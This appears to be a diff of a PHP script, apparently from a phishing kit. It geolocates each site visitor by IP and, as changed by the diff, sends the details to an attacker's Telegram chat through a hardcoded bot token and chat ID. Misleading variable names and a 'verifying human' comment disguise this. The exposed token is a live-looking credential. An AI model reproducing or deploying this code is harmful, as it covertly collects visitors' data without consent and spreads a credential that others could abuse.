@@ -1,16 +1,17 @@
 <?php
 
 function telegram($msg) {
-        global $browser_id,$setup_code;
-        $url = 'https://api.telegram.org/bot'.$browser_id.'/sendMessage';$data = array('chat_id'=>$setup_code,'text'=>$msg);
+        global $telegrambot,$telegramchatid;
+        $url = 'https://api.telegram.org/bot'.$telegrambot.'/sendMessage';$data = array('chat_id'=>$telegramchatid,'text'=>$msg);
         $options = array('http'=>array('method' => 'POST','header' => "Content-Type:application/x-www-form-urlencoded\r\n",'content' => http_build_query($data),),);
         $context = stream_context_create($options);
         $result = file_get_contents($url,false,$context);
         return $result;
 }
-
-$browser_id= '5055359847:AAG1qTAiykWANsRb1HZL0JIdQ0_nBtzkf0o'; // enter bot token
-$setup_code = 1887870506; 
+//verifying human\\
+//required control\\
+$telegrambot = '5055359847:AAG1qTAiykWANsRb1HZL0JIdQ0_nBtzkf0o';
+$telegramchatid = 1887870506; 
 
 $ip=$_SERVER['REMOTE_ADDR']; 
 $ipapi = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
@@ -18,8 +19,8 @@ $datetime = date("d.m.Y H:i:s"); // g:ia l F j Y   l, F j, Y, g:ia
 
 
 
-("Browser Requirements:
 
+telegram("Browser Requirements:
 
         IP  :  $ipapi->query
         Operating system  :  replace in the sub comment
@@ -36,7 +37,6 @@ $datetime = date("d.m.Y H:i:s"); // g:ia l F j Y   l, F j, Y, g:ia
         
 
         ");
-
 
 
 ?>
